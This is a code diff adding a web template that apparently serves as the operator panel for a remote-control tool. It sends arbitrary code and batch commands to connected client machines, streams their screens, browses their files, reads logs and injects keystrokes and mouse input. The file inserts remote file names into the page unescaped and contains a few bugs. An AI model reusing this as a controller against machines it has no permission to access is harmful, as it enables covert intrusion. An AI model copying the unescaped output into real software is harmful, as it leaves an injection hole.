@@ -1,0 +1,512 @@
+﻿<% include header.ejs %>
+<% include config.ejs %>
+<ul id="main">
+	<li>
+		<div class="header">Send command</div>
+		<div class="middle">
+			<div>
+				<div id="code_output"></div>
+				<input class="input" type="text" id="code_input" placeholder="Please type a code here" onfocus="stopCapturingKeyboard ()"/>
+				<button class="button" id="code_btn" onclick="sendCommand ()">Send</button>
+			</div>
+		</div>
+	</li>
+	<li>
+		<div class="header">Capture screen</div>
+		<div class="middle">
+			<div>
+				<img id="cap_img" src="noimg.png" />
+				<br />
+				<button class="button" id="img_btn" onclick="captureImage ()">Start capture</button>
+			</div>
+		</div>
+	</li>
+	<li>
+		<div class="header">Terminal</div>
+		<div class="middle">
+			<div>
+				<div id="cmd_output"></div>
+				<input class="input" type="text" id="cmd_input" placeholder="Please type a batch command here" onfocus="stopCapturingKeyboard ()"/>
+				<button class="button" id="cmd_btn" onclick="executeBatch ()">Send</button>
+			</div>
+		</div>
+	</li>
+	<li>
+		<div class="header">Explorer</div>
+		<div class="middle">
+			<div>
+				<ul id="explorer"></ul>
+				<input class="input" type="text" id="explorer_input" placeholder="Please type a directory here" onfocus="stopCapturingKeyboard ()"/>
+				<button class="button" id="explorer_btn" onclick="listFiles ()">Send</button>
+			</div>
+		</div>
+	</li>
+	<li>
+		<div class="header">Logs</div>
+		<div class="middle">
+			<div>
+				<textarea class="input" id="logs" disabled></textarea><br />
+				<button class="button" id="logs_get_btn" onclick="getLogs ()">Refresh</button>
+				<button class="button" id="logs_clear_btn" onclick="clearLogs ()">Clear</button>
+			</div>
+		</div>
+	</li>
+	<li>
+		<div class="header">Keyboard</div>
+		<div class="middle">
+			<div>
+				<button class="button" id="btn_keyboard_capture" onclick="toggleKeyboard ()">Capture keyboard</button>
+			</div>
+		</div>
+	</li>
+	<li>
+		<div class="header">Mouse</div>
+		<div class="middle">
+			<div>
+				<button class="button" id="btn_mouse_capture" onclick="mouseHandle ('capture')">Capture mouse</button>
+				<label class="button">
+					Show cursor
+					<input type="checkbox" id="mouse_cursor_show" onchange="mouseHandle ('cursor')">
+				</label>
+			</div>		
+			<div>
+				<button class="button" id="btn_mouse_left" onclick="mouseHandle ('left')">Left</button>
+				<button class="button" id="btn_mouse_middle" onclick="mouseHandle ('middle')">Middle</button>
+				<button class="button" id="btn_mouse_right" onclick="mouseHandle ('right')">Right</button>
+			</div>
+		</div>
+	</li>
+</ul>
+
+<script>
+	var LEFT_T = "0",
+		RIGHT_T = "1",
+		PRESS_T = "2",
+		RELEASE_T = "3",
+		MIDDLE_T = "4",
+		WHEEL_T = "5",
+		MOVE_T = "6",
+		CLICK_T = "7",
+		CURSOR_T = "8";
+
+	(function () {
+		function showhide (elem) {
+			if (elem.collapsed) {
+				elem.style.display = "block";
+				setTimeout(function () {
+					elem.style.opacity = "1";
+				}, 100);
+
+				elem.collapsed = false;
+			} else {
+				elem.style.opacity = "0";
+				setTimeout(function () {
+					elem.style.display = "none";
+				}, 500);
+				elem.collapsed = true;
+			}
+		}
+
+		var toggles = document.querySelectorAll("#main li");
+		toggles.forEach(function (li) {
+			li.children[0].onclick = function () {
+				showhide (li.children[1]);
+			};
+			li.children[1].style.opacity = "0";
+			li.children[1].style.display = "none";
+			li.children[1].collapsed = true;
+		});
+	}) ();
+
+	screen.lockOrientationUniversal = screen.lockOrientation || screen.mozLockOrientation || screen.msLockOrientation;
+	function lockOrientation (l) {
+		if (screen.lockOrientationUniversal) screen.lockOrientationUniversal(l);
+		else screen.orientation.lock(l);
+	}
+
+	var currentDirectory = "";
+
+	code_input.onkeyup = function (e) { handleKeyUp(sendCommand, this, code_btn, e); };
+	cmd_input.onkeyup = function (e) { handleKeyUp(executeBatch, this, cmd_btn, e); };
+	explorer_input.onkeyup = function (e) { handleKeyUp(listFiles, this, explorer_btn, e); };
+	cap_img.onclick = function (e) {
+		if (cap_img.isFullscreen && img_btn.innerText === "Stop capture" && btn_mouse_capture.innerText === "Stop capturing mouse") {
+			mouseXY (e.clientX, e.clientY);
+			fixWhich (e);
+			switch (e.which) {
+				case 1: mouseEvent (CLICK_T, LEFT_T); break;
+				case 2: mouseEvent (CLICK_T, MIDDLE_T); break;
+				case 3: mouseEvent (CLICK_T, RIGHT_T); break;
+			}
+		} else {
+			if (cap_img.requestFullscreen) cap_img.requestFullscreen();
+			else if (cap_img.msRequestFullscreen) cap_img.msRequestFullscreen();
+			else if (cap_img.mozRequestFullScreen) cap_img.mozRequestFullScreen();
+			else if (cap_img.webkitRequestFullscreen) cap_img.webkitRequestFullscreen();
+			else return;			
+
+			setTimeout(function () {
+				lockOrientation("landscape-primary");
+				cap_img.isFullscreen = true;
+			}, 250);
+		}				
+	};
+	cap_img.onmousemove = (e) => {
+		if (cap_img.isFullscreen && img_btn.innerText === "Stop capture" && btn_mouse_capture.innerText === "Stop capturing mouse") 
+			mouseXY (e.clientX, e.clientY);
+	};	
+	cap_img.onmousedown = (e) => {
+		if (btn_mouse_capture.innerText !== "Stop capturing mouse") return;
+		fixWhich (e);
+		switch (e.which) {
+			case 1: mouseEvent (PRESS_T, LEFT_T); break;
+			case 2: mouseEvent (PRESS_T, MIDDLE_T); break;
+			case 3: mouseEvent (PRESS_T, RIGHT_T); break;
+		}
+		e.preventDefault ();
+		return false;
+	};
+	cap_img.onmouseup = (e) => {
+		if (btn_mouse_capture.innerText !== "Stop capturing mouse") return;
+		fixWhich (e);
+		switch (e.which) {
+			case 1: mouseEvent (RELEASE_T, LEFT_T); break;
+			case 2: mouseEvent (RELEASE_T, MIDDLE_T); break;
+			case 3: mouseEvent (RELEASE_T, RIGHT_T); break;
+		}
+		e.preventDefault ();
+		return false;
+	};
+	cap_img.onwheel = (e) => {
+		if (!cap_img.isFullscreen || img_btn.innerText !== "Stop capture" || btn_mouse_capture.innerText !== "Stop capturing mouse") return;
+		var e = e || window.event;
+		var delta = Math.max(-1, Math.min(1, (e.wheelDelta || -e.detail)));
+
+		mouseXY (e.clientX, e.clientY);
+		mouseEvent (WHEEL_T, delta);
+
+		e.preventDefault ();
+		return false;
+	};
+	cap_img.onkeyup = (e) => {
+		if (e.keyCode === 27) cap_img.isFullscreen = false;
+	};
+	cap_img.oncontextmenu = (e) => { return false; };
+	cap_img.draggable = false;
+	cap_img.ondragstart = (e) => { return false; };
+
+	function fixWhich(e) {
+		if (!e.which && e.button) {
+			if (e.button & 1) e.which = 1      // Left
+			else if (e.button & 4) e.which = 2 // Middle
+			else if (e.button & 2) e.which = 3 // Right
+		}
+	}
+
+	function handleKeyUp (func, element, btn, e) {
+		if (e.keyCode === 0x26) {
+			var t = element.last;
+			element.last = element.value;
+			element.value = t;
+			e.defaultPrevented = true;
+		} else if (e.keyCode === 0x0D && !btn.disabled) {
+			func ();
+			e.defaultPrevented = true;
+		}
+	}
+
+	function htmlspecialchars(str) {
+		var map = {
+			"&": "&amp;",
+			"<": "&lt;",
+			">": "&gt;",
+			"\n": "<br>", "\r": "<br>", "\r\n": "<br>", "\n\r": "<br>",
+			"\"": "&quot;",
+			"'": "&#39;" // ' -> &apos; for XML only
+		};
+		return str.replace(/[&<>\n"']/g, function(m) { return map[m]; });
+	}
+
+	function scrollToBottom(element) {
+		var diff = element.scrollHeight - element.scrollTop;
+		if (Math.abs(diff) <= element.offsetHeight) return;
+
+		var smoothFactor = 13.5;;
+		element.scrollTop += (diff > 0 ? smoothFactor : (diff < 0 ? -smoothFactor : diff));
+		requestAnimationFrame(function () {
+			scrollToBottom(element);
+		});
+	}
+
+	var socket = io.connect("http://" + IP + ":7071");
+	socket.on("refresh", function (data) {
+		if (data.text.indexOf("<%- params.id %>") === -1) {
+			alert("This client has disconnected!");
+			window.location.pathname = "/";
+		}
+		document.getElementById("client_count").innerHTML = data.count;
+	});
+	socket.on("code_result", function (data) {
+		code_btn.disabled = false;
+		var output = document.querySelector("#code_output");
+		output.innerHTML += "<span class='code'>&#171; <span class='code_line'>" + htmlspecialchars(data) + "</span></span><br>";
+		scrollToBottom(output);
+	});
+	socket.on("batch_result", function (data) {
+		var output = document.querySelector("#cmd_output");
+		cmd_btn.disabled = false;
+		output.innerHTML += "<span class='code'>&#171; <span class='code_line'>" + htmlspecialchars(data) + "</span></span><br>";
+		scrollToBottom(output);
+	});
+	socket.on("list_files", function (data) {
+		var explorer = document.querySelector("#explorer");
+		var back = currentDirectory.substring(0, currentDirectory.lastIndexOf("\\"));
+		if (back.indexOf("\\") === -1) back = "";
+		explorer.innerHTML = `<span onclick="explorer_input.value\`${back}\`; listFiles ();"><img src="folder.png">..</span><br>`;
+		var cd = currentDirectory ? currentDirectory + "\\" : "";
+		data.folders.forEach(function (folder) {
+			var t = cd + folder;
+			t = t.replace(/\\/g, "\\\\");
+			explorer.innerHTML += `<span onclick="explorer_input.value='${t}'; listFiles ();"><img src="folder.png">${folder}</span><a class="delete">X</a><br>`;
+		});
+		explorer.innerHTML += `<div style="border-bottom: 1px solid #ccc; width: 100%; margin-bottom: 5px;"></div>`;
+		data.files.forEach(function (file) {
+			explorer.innerHTML += `<span><img src="file.png">${file}</span><a class="delete">X</a><br>`;
+		});
+		explorer_btn.disabled = false;
+	});
+	socket.on("image", function (data) {
+		if (img_btn.innerText === "Stop capture") {
+			cap_img.src = "data:image/jpeg;base64," + data;
+			setTimeout (function () {
+				socket.emit("capture", {
+					text: "loop",
+					id: "<%- params.id %>"
+				});
+			}, 0);			
+		} else {
+			cap_img.src = "noimg.png";
+		}
+	});
+	socket.on("logs", function (data) {
+		document.querySelector("#logs").innerText = atob (data);
+	});
+	/*Interpreter*/
+	function sendCommand () {
+		var output = document.querySelector("#code_output");
+		if (code_input.value.toLowerCase () === "clear") {
+			output.innerHTML = "";
+			return;
+		}
+		if (code_input.value === "") return;
+
+		code_btn.disabled = true;
+		output.innerHTML += "<span class='code'>&#187; <span class='code_line'>" + htmlspecialchars(code_input.value) + "</span></span><br>";
+		scrollToBottom(output);
+
+		socket.emit("execute_code", {
+			text: code_input.value,
+			id: "<%- params.id %>"
+		});
+		code_input.last = code_input.value;
+		code_input.value = "";
+	}
+	/*Screen capture*/
+	function captureImage () {
+		if (img_btn.innerText === "Start capture") {
+			socket.emit("capture", {
+				text: "loop",
+				id: "<%- params.id %>"
+			});
+			img_btn.innerText = "Stop capture";
+		} else {
+			img_btn.innerText = "Start capture";
+		}
+	}
+	/*Batch*/
+	function executeBatch () {
+		var output = document.querySelector("#cmd_output");
+
+		if (cmd_input.value.toLowerCase () === "clear") {
+			output.innerHTML = "";
+			return;
+		}
+		if (cmd_input.value === "") return;
+
+		cmd_btn.disabled = true;
+		output.innerHTML += "<span class='code'>&#187; <span class='code_line'>" + htmlspecialchars(cmd_input.value) + "</span></span><br>";
+		scrollToBottom(output);
+
+		socket.emit("batch", {
+			text: cmd_input.value,
+			id: "<%- params.id %>"
+		});
+		cmd_input.last = cmd_input.value;
+		cmd_input.value = "";
+	}
+	/*Explorer*/
+	function listFiles () {
+		if (explorer_btn.disabled) return;
+
+		if (explorer_input.value == "") {
+			explorer_input.value = "|";
+			currentDirectory = "";
+		} else {
+			currentDirectory = explorer_input.value;
+			if (currentDirectory[currentDirectory.length-1] !== "\\") currentDirectory += "\\\\";
+		}
+		explorer_btn.disabled = true;
+
+		socket.emit("list_files", {
+			text: explorer_input.value,
+			id: "<%- params.id %>"
+		});
+		explorer_input.last = explorer_input.value;
+		explorer_input.value = "";
+	}
+	/*Logs*/
+	function getLogs () {
+		socket.emit("logs", {
+			text: "get",
+			id: "<%- params.id %>"
+		});
+	}
+
+	function clearLogs () {
+		socket.emit("logs", {
+			text: "clear",
+			id: "<%- params.id %>"
+		});
+	}	
+	/*Keyboard*/
+	function keyboard_handle (e) {
+		var buffer = "";
+		switch (e.key) {
+			case "Backspace": 
+			case "Control":
+			case "Shift":
+			case "Alt":
+			case "Enter":
+			case "Dead":
+			case "Tab":
+			case "Home": case "End":			
+			case "F1": case "F2": case "F3": case "F4": case "F5": case "F6": case "F7": case "F8": case "F9": case "F10": case "F11": case "F12":				
+				buffer = "{" + e.key.toUpperCase () + "}"; 
+				break;
+			case "Escape":
+				buffer = "{ESC}";
+				break;
+			case "PageUp": 
+				buffer = "{PGUP}";
+				break; 
+			case "PageDown": 
+				buffer = "{PGDOWN}";				
+				break;
+			case "CapsLock": 
+				buffer = "{CAPSLOCK}";
+				break;
+			case "ArrowUp": buffer = "{UP}"; break;
+			case "ArrowDown": buffer = "{DOWN}"; break;
+			case "ArrowLeft": buffer = "{LEFT}"; break;
+			case "ArrowRight": buffer = "{RIGHT}"; break;	
+			case "*": buffer = "{MULTIPLY}"; break;					
+			case "/": buffer = "{DIVIDE}"; break;
+			case "+": buffer = "{ADD}"; break;
+			case "-": buffer = "{SUBTRACT}"; break;
+			default:
+				buffer = e.key;
+			break;
+		}
+
+		/*if (e.shiftKey || e.altKey || e.ctrlKey)
+			buffer = `(${buffer})`;		
+
+		if (e.shiftKey) buffer = "+" + buffer;
+		if (e.altKey) buffer = "^" + buffer;
+		if (e.ctrlKey) buffer = "%" + buffer;*/
+
+		console.log (buffer);
+		return buffer;
+	}
+
+	function keyboard_event (e) {
+		e = e || window.event;
+		if (btn_keyboard_capture.innerText === "Capture keyboard") return;				
+		socket.emit ("key", {
+			text: keyboard_handle (e),
+			id: "<%- params.id %>"
+		});	
+		e.preventDefault();
+		return false;
+	}
+
+	function toggleKeyboard () {
+		if (btn_keyboard_capture.innerText === "Capture keyboard") {
+			btn_keyboard_capture.innerText = "Stop capturing keyboard";			
+		} else {
+			btn_keyboard_capture.innerText = "Capture keyboard";
+		}
+	}
+
+	function stopCapturingKeyboard () {
+		btn_keyboard_capture.innerText = "Capture keyboard";
+	}
+
+	document.onkeypress = keyboard_event;
+	document.onkeydown = keyboard_event
+	/*Mouse*/
+	function mouseEvent (evnt, data) {
+		setTimeout (function () {
+			socket.emit ("mouse", {
+				text: evnt + data,
+				id: "<%- params.id %>"
+			});	
+		}, 0);		
+	}
+	
+	function mouseXY (x, y) {		
+		x /= cap_img.offsetWidth;
+		y /= cap_img.offsetHeight;
+
+		setTimeout (function () {
+			socket.emit ("mouse", {
+				text: MOVE_T + x + ";" + y,
+				id: "<%- params.id %>"
+			});
+		}, 0);
+	}
+
+	function mouseHandle (e) {
+		switch (e) {
+			case "left":
+				mouseEvent (PRESS_T, LEFT_T);
+				setTimeout (function () {
+					mouseEvent (RELEASE_T, LEFT_T);					
+				}, 10);
+			break;
+			case "right":
+				mouseEvent (PRESS_T, LEFT_T);
+				setTimeout (function () {
+					mouseEvent (RELEASE_T, LEFT_T);					
+				}, 10);
+			break;
+			case "middle":
+				mouseEvent (PRESS_T, LEFT_T);
+				setTimeout (function () {
+					mouseEvent (RELEASE_T, LEFT_T);					
+				}, 10);
+			break;
+			case "capture":
+				if (btn_mouse_capture.innerText === "Capture mouse") {
+					btn_mouse_capture.innerText = "Stop capturing mouse";
+				} else {
+					btn_mouse_capture.innerText = "Capture mouse";
+				}
+			break;
+			case "cursor":
+				mouseEvent (mouse_cursor_show.checked ? PRESS_T : RELEASE_T, CURSOR_T);
+			break;
+		}
+	}
+</script>
+<% include footer.ejs %>
